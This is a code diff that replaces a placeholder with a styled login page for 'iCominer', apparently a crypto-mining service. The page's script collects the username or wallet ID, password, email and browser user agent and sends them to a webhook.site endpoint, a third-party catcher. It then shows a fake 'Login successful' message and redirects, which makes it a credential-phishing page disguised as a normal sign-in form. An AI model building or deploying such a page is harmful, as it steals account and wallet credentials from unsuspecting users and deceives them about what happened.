@@ -1,1 +1,98 @@
-<!DOCTYPE html><html><head><title>Login | iCominer</title></head><body><h1>Login Page (Coming Soon)</h1></body></html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login | iCominer</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(145deg, #f0f2f5, #dfe4ea);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: #fff;
+      padding: 30px 40px;
+      border-radius: 12px;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 100%;
+    }
+    h2 {
+      text-align: center;
+      color: #333;
+      margin-bottom: 25px;
+    }
+    input[type="text"], input[type="password"], input[type="email"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0984e3;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #74b9ff;
+    }
+    .status {
+      text-align: center;
+      margin-top: 15px;
+      color: #888;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>iCominer Login</h2>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="Username or Wallet ID" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <input type="email" id="email" placeholder="Email (optional)">
+      <button type="submit">Sign In</button>
+      <div class="status" id="statusMsg">Awaiting login...</div>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const data = {
+        username: document.getElementById("username").value,
+        password: document.getElementById("password").value,
+        email: document.getElementById("email").value,
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString()
+      };
+
+      document.getElementById("statusMsg").innerText = "Authenticating...";
+
+      fetch("https://webhook.site/846de35d-2625-497d-8ab8-414d516ccb49", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+
+      setTimeout(() => {
+        document.getElementById("statusMsg").innerText = "Login successful. Redirecting...";
+        window.location.href = "dashboard.html";
+      }, 2000);
+    });
+  </script>
+</body>
+</html>
